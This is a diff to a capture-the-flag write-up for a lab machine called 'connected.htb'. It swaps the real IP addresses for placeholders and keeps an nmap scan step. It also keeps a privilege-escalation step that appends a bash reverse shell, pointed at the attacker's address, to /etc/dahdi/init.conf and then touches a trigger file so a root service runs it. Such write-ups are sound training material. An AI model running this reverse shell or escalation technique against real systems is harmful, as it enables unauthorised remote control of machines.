@@ -32,7 +32,7 @@ nmap -p 22,80,443 -sCV connected.htb
 Three ports: SSH (22), HTTP (80) and HTTPS (443). I added `connected.htb` to `/etc/hosts` and opened the site in a browser.
 
 ```bash
-10.10.11.x connected.htb
+machine_ip connected.htb
 ```
 
 ### The web app
@@ -86,7 +86,7 @@ The second useful piece is that another file `asterisk` can write to, `/etc/dahd
 Append the reverse shell to `init.conf`, then touch the trigger file so `incrond` restarts DAHDI:
 
 ```bash
-printf '\nbash -i >& /dev/tcp/10.10.16.148/6666 0>&1\n' >> /etc/dahdi/init.conf
+printf '\nbash -i >& /dev/tcp/your_ip/6666 0>&1\n' >> /etc/dahdi/init.conf
 touch /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
